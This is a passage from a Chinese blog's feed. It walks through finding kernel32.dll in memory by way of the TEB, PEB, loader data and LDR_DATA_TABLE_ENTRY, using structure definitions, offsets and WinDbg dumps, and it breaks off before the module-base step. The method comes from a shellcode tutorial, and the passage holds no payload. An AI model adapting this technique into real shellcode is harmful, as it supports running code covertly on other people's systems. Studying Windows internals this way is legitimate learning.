&lt;p>文中有些地方比较怪，比如说先编译了正常 loader 再编译 shifted_loader 就让人不是很理解，照抄抄出一堆bug。所以本文的脚本和参考的脚本已经有点对不上了。&lt;/p>
&lt;p>受制于不知道怎么编译出没有重定位的程序，我拿一个有重定位的做了实验（理论上来说，应该是一样的吧？），所以到头也不确定是不是真的能把没有重定位的程序跑起来。&lt;/p>
&lt;p>就这样吧，这个结论有点长。到这就差不多了。&lt;/p></description></item><item><title>关于在内存里找kernel32这件事</title><link>https://nnnewb.github.io/blog/p/find-kernel32-in-memory/</link><pubDate>Thu, 14 Oct 2021 16:31:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/find-kernel32-in-memory/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>总得有个前言。&lt;/p>
&lt;p>用 nasm 手工打造了一个 PE 文件后，这个 PE 文件还没什么卵用。如果要动 IAT，又嫌麻烦。网上冲浪找到&lt;a class="link" href="https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode#finding-kernel32-base-address" target="_blank" rel="noopener"
>一篇关于 shellcode 的文章&lt;/a>，讲如何在内存里找到 kernel32.dll 并调用 WinExec 函数，于是就想实践一下看看，实际抄代码碰到不少坑。对汇编又熟悉了一点。&lt;/p>
&lt;h2 id="0x01-寻找-kernel32">0x01 寻找 kernel32&lt;/h2>
&lt;p>微软有一篇很&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/debug/thread-environment-block--debugging-notes-" target="_blank" rel="noopener"
>简短的文章&lt;/a>。&lt;/p>
&lt;blockquote>
&lt;p>The Thread Environment Block (&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb" target="_blank" rel="noopener"
>&lt;strong>TEB structure&lt;/strong>&lt;/a>) holds context information for a thread.&lt;/p>
&lt;p>In the following versions of Windows, the offset of the 32-bit TEB address within the 64-bit TEB is 0. This can be used to directly access the 32-bit TEB of a WOW64 thread. This might change in later versions of Windows&lt;/p>
&lt;/blockquote>
&lt;p>另外在&lt;a class="link" href="https://en.wikipedia.org/wiki/Win32_Thread_Information_Block" target="_blank" rel="noopener"
>维基百科页面&lt;/a>也有一点概述，&lt;em>TIB&lt;/em> 就是 &lt;em>TEB&lt;/em> 。&lt;em>TIB&lt;/em> 全称是 &lt;em>Thread Information Block&lt;/em> ，&lt;em>TEB&lt;/em> 是 &lt;em>Thread Environment Block&lt;/em> 。&lt;/p>
&lt;p>关于 &lt;em>TIB&lt;/em> 和 &lt;em>TEB&lt;/em> 的微软官方文档和文章链接很多都失效了，能找到的相关信息不多。但是微软至少还&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb" target="_blank" rel="noopener"
>给出了 TEB 的结构定义&lt;/a>吧（在Windows SDK 里）。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_TEB&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PPEB&lt;/span> &lt;span class="n">ProcessEnvironmentBlock&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">399&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">BYTE&lt;/span> &lt;span class="n">Reserved3&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1952&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">TlsSlots&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">BYTE&lt;/span> &lt;span class="n">Reserved4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved5&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">ReservedForOle&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved6&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">TlsExpansionSlots&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="n">TEB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PTEB&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>大量的刺眼的 &lt;code>Reserved&lt;/code> 。不过还好，花了点时间还是谷歌出了所谓的&lt;code>Undocumented&lt;/code>的相关信息。&lt;a class="link" href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FTEB.html" target="_blank" rel="noopener"
>NTAPI Undocumented Function&lt;/a>。也可以像我看的那篇文章一样，用 &lt;code>WinDbg Preview&lt;/code> 去实际看看内存里的结构。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_TEB&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">NT_TIB&lt;/span> &lt;span class="n">Tib&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">EnvironmentPointer&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">CLIENT_ID&lt;/span> &lt;span class="n">Cid&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">ActiveRpcInfo&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">ThreadLocalStoragePointer&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PPEB&lt;/span> &lt;span class="n">Peb&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">LastErrorValue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">CountOfOwnedCriticalSections&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">CsrClientThread&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">Win32ThreadInfo&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">Win32ClientInfo&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x1F&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">WOW32Reserved&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">CurrentLocale&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">FpSoftwareStatusRegister&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">SystemReserved1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x36&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">Spare1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">ExceptionCode&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">SpareBytes1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x28&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">SystemReserved2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0xA&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">GdiRgn&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">GdiPen&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">GdiBrush&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">CLIENT_ID&lt;/span> &lt;span class="n">RealClientId&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">GdiCachedProcessHandle&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">GdiClientPID&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">GdiClientTID&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">GdiThreadLocaleInfo&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">UserReserved&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">GlDispatchTable&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x118&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">GlReserved1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x1A&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">GlReserved2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">GlSectionInfo&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">GlSection&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">GlTable&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">GlCurrentRC&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">GlContext&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">NTSTATUS&lt;/span> &lt;span class="n">LastStatusValue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">UNICODE_STRING&lt;/span> &lt;span class="n">StaticUnicodeString&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">WCHAR&lt;/span> &lt;span class="n">StaticUnicodeBuffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x105&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">DeallocationStack&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">TlsSlots&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x40&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">LIST_ENTRY&lt;/span> &lt;span class="n">TlsLinks&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">Vdm&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">ReservedForNtRpc&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">DbgSsReserved&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x2&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">HardErrorDisabled&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">Instrumentation&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x10&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">WinSockData&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">GdiBatchCount&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">Spare2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">Spare3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">Spare4&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">ReservedForOle&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">WaitingOnLoaderLock&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">StackCommit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">StackCommitMax&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">StackReserved&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="n">TEB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PTEB&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>不过依然没什么卵用，因为在乎的只有 PPEB 这个字段。好吧，点到为止。&lt;/p>
&lt;p>在那篇文章的原文里，给出的找到 kernel32.dll 的查找路径是这样的：&lt;code>TEB-&amp;gt;PEB-&amp;gt;Ldr-&amp;gt;InMemoryOrderLoadList-&amp;gt;currentProgram-&amp;gt;ntdll-&amp;gt;kernel32.BaseDll&lt;/code>&lt;/p>
&lt;h3 id="11--process-environment-block">1.1 Process Environment Block&lt;/h3>
&lt;p>从 TEB 出发，找到 PEB &lt;code>(12*sizeof PVOID)==48==0x30&lt;/code> 。PEB 的结构如下，文档参考&lt;a class="link" href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%2FPEB.html" target="_blank" rel="noopener"
>这个&lt;/a>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_PEB&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">BOOLEAN&lt;/span> &lt;span class="n">InheritedAddressSpace&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">BOOLEAN&lt;/span> &lt;span class="n">ReadImageFileExecOptions&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">BOOLEAN&lt;/span> &lt;span class="n">BeingDebugged&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">BOOLEAN&lt;/span> &lt;span class="n">Spare&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">HANDLE&lt;/span> &lt;span class="n">Mutant&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">ImageBaseAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PPEB_LDR_DATA&lt;/span> &lt;span class="n">LoaderData&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PRTL_USER_PROCESS_PARAMETERS&lt;/span> &lt;span class="n">ProcessParameters&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">SubSystemData&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">ProcessHeap&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">FastPebLock&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PPEBLOCKROUTINE&lt;/span> &lt;span class="n">FastPebLockRoutine&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PPEBLOCKROUTINE&lt;/span> &lt;span class="n">FastPebUnlockRoutine&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">EnvironmentUpdateCount&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PPVOID&lt;/span> &lt;span class="n">KernelCallbackTable&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">EventLogSection&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">EventLog&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PPEB_FREE_BLOCK&lt;/span> &lt;span class="n">FreeList&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">TlsExpansionCounter&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">TlsBitmap&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">TlsBitmapBits&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x2&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">ReadOnlySharedMemoryBase&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">ReadOnlySharedMemoryHeap&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PPVOID&lt;/span> &lt;span class="n">ReadOnlyStaticServerData&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">AnsiCodePageData&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">OemCodePageData&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">UnicodeCaseTableData&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">NumberOfProcessors&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">NtGlobalFlag&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">BYTE&lt;/span> &lt;span class="n">Spare2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x4&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">LARGE_INTEGER&lt;/span> &lt;span class="n">CriticalSectionTimeout&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">HeapSegmentReserve&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">HeapSegmentCommit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">HeapDeCommitTotalFreeThreshold&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">HeapDeCommitFreeBlockThreshold&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">NumberOfHeaps&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">MaximumNumberOfHeaps&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PPVOID&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">ProcessHeaps&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">GdiSharedHandleTable&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">ProcessStarterHelper&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">GdiDCAttributeList&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">LoaderLock&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">OSMajorVersion&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">OSMinorVersion&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">OSBuildNumber&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">OSPlatformId&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">ImageSubSystem&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">ImageSubSystemMajorVersion&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">ImageSubSystemMinorVersion&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">GdiHandleBuffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x22&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">PostProcessInitRoutine&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">TlsExpansionBitmap&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">BYTE&lt;/span> &lt;span class="n">TlsExpansionBitmapBits&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">SessionId&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="n">PEB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PPEB&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接着从 PEB 找到 &lt;code>Ldr&lt;/code>，位置是 &lt;code>(sizeof(BOOLEAN)*4+sizeof(HANDLE)+sizeof(PVOID))==12==0xc&lt;/code>。&lt;/p>
&lt;h3 id="12-peb_ldr_data">1.2 PEB_LDR_DATA&lt;/h3>
&lt;p>接着从 &lt;code>PEB_LDR_DATA&lt;/code> 结构里找 &lt;code>InMemoryOrderModuleList&lt;/code> 这个字段，&lt;code>PEB_LDR_DATA&lt;/code> 结构如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_PEB_LDR_DATA&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">BOOLEAN&lt;/span> &lt;span class="n">Initialized&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">SsHandle&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">LIST_ENTRY&lt;/span> &lt;span class="n">InLoadOrderModuleList&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">LIST_ENTRY&lt;/span> &lt;span class="n">InMemoryOrderModuleList&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">LIST_ENTRY&lt;/span> &lt;span class="n">InInitializationOrderModuleList&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="n">PEB_LDR_DATA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PPEB_LDR_DATA&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>找到&lt;code>InMemoryOrderModuleList&lt;/code>字段，位置是&lt;code>(sizeof(ULONG)+sizeof(BOOLEAN)+sizeof(PVOID)+sizeof(LIST_ENTRY))==20==0x14&lt;/code>&lt;/p>
&lt;p>注意 &lt;code>sizeof(BOOLEAN)&lt;/code> 是 &lt;code>BYTE&lt;/code> 类型，但这个结构体是被对齐到了4字节的，所以 BOOLEAN 字段后面实际有3个字节的 padding。合起来就是三个 DWORD 。&lt;/p>
&lt;h3 id="13-ldr_data_table_entry">1.3 LDR_DATA_TABLE_ENTRY&lt;/h3>
&lt;p>之后就是 LIST_ENTRY 这个结构了，用 WinDbg 查了下结构：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">0:000&amp;gt; dt _LIST_ENTRY
ntdll!_LIST_ENTRY
+0x000 Flink : Ptr32 _LIST_ENTRY
+0x004 Blink : Ptr32 _LIST_ENTRY
&lt;/code>&lt;/pre>&lt;/div>&lt;p>根据上面 &lt;em>Undocumented&lt;/em> 文档和原文章的叙述来看，这应该就是个指向 &lt;code>_LDR_DATA_TABLE_ENTRY&lt;/code> 结构（双向链表）的指针。&lt;code>_LIST_ENTRY&lt;/code>结构本身是包含两个指针，一个&lt;code>Forward&lt;/code>正向指针，一个&lt;code>Backward&lt;/code>。所以我们取&lt;code>Flink&lt;/code>字段就可以，跳过&lt;code>InLoadOrderModuleList&lt;/code>这个字段后，一共偏移 &lt;code>0x14&lt;/code> 就是我们要的 &lt;code>Flink&lt;/code> 指针了，指向的应该是 &lt;code>_LDR_DATA_TABLE_ENTRY&lt;/code> 这个结构体中的 &lt;code>InMemoryOrderLinks&lt;/code> 字段。下面给出&lt;code>_LDR_DATA_TABLE_ENTRY&lt;/code>的结构（WinDbg）。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">0:000&amp;gt; dt _ldr_data_table_entry
ntdll!_LDR_DATA_TABLE_ENTRY
+0x000 InLoadOrderLinks : _LIST_ENTRY
+0x008 InMemoryOrderLinks : _LIST_ENTRY
+0x010 InInitializationOrderLinks : _LIST_ENTRY
+0x018 DllBase : Ptr32 Void
+0x01c EntryPoint : Ptr32 Void
+0x020 SizeOfImage : Uint4B
+0x024 FullDllName : _UNICODE_STRING
+0x02c BaseDllName : _UNICODE_STRING
+0x034 FlagGroup : [4] UChar
+0x034 Flags : Uint4B
+0x034 PackagedBinary : Pos 0, 1 Bit
+0x034 MarkedForRemoval : Pos 1, 1 Bit
+0x034 ImageDll : Pos 2, 1 Bit
+0x034 LoadNotificationsSent : Pos 3, 1 Bit
+0x034 TelemetryEntryProcessed : Pos 4, 1 Bit
+0x034 ProcessStaticImport : Pos 5, 1 Bit
+0x034 InLegacyLists : Pos 6, 1 Bit
+0x034 InIndexes : Pos 7, 1 Bit
+0x034 ShimDll : Pos 8, 1 Bit
+0x034 InExceptionTable : Pos 9, 1 Bit
+0x034 ReservedFlags1 : Pos 10, 2 Bits
+0x034 LoadInProgress : Pos 12, 1 Bit
+0x034 LoadConfigProcessed : Pos 13, 1 Bit
+0x034 EntryProcessed : Pos 14, 1 Bit
+0x034 ProtectDelayLoad : Pos 15, 1 Bit
+0x034 ReservedFlags3 : Pos 16, 2 Bits
+0x034 DontCallForThreads : Pos 18, 1 Bit
+0x034 ProcessAttachCalled : Pos 19, 1 Bit
+0x034 ProcessAttachFailed : Pos 20, 1 Bit
+0x034 CorDeferredValidate : Pos 21, 1 Bit
+0x034 CorImage : Pos 22, 1 Bit
+0x034 DontRelocate : Pos 23, 1 Bit
+0x034 CorILOnly : Pos 24, 1 Bit
+0x034 ChpeImage : Pos 25, 1 Bit
+0x034 ReservedFlags5 : Pos 26, 2 Bits
+0x034 Redirected : Pos 28, 1 Bit
+0x034 ReservedFlags6 : Pos 29, 2 Bits
+0x034 CompatDatabaseProcessed : Pos 31, 1 Bit
+0x038 ObsoleteLoadCount : Uint2B
+0x03a TlsIndex : Uint2B
+0x03c HashLinks : _LIST_ENTRY
+0x044 TimeDateStamp : Uint4B
+0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT
+0x04c Lock : Ptr32 Void
+0x050 DdagNode : Ptr32 _LDR_DDAG_NODE
+0x054 NodeModuleLink : _LIST_ENTRY
+0x05c LoadContext : Ptr32 _LDRP_LOAD_CONTEXT
+0x060 ParentDllBase : Ptr32 Void
+0x064 SwitchBackContext : Ptr32 Void
+0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE
+0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE
+0x080 OriginalBase : Uint4B
+0x088 LoadTime : _LARGE_INTEGER
+0x090 BaseNameHashValue : Uint4B
+0x094 LoadReason : _LDR_DLL_LOAD_REASON
+0x098 ImplicitPathOptions : Uint4B
+0x09c ReferenceCount : Uint4B
+0x0a0 DependentLoadFlags : Uint4B
+0x0a4 SigningLevel : UChar
&lt;/code>&lt;/pre>&lt;/div>&lt;p>要注意到 &lt;code>_LDR_DATA_TABLE_ENTRY&lt;/code> 结构中的 &lt;code>InMemoryOrderLinks&lt;/code> 并不是在结构开头，所以取得的地址必须先减去这个偏移值（8字节）再转换类型才是正确的结构。&lt;/p>
&lt;h3 id="14-模块基址">1.4 模块基址&lt;/h3>
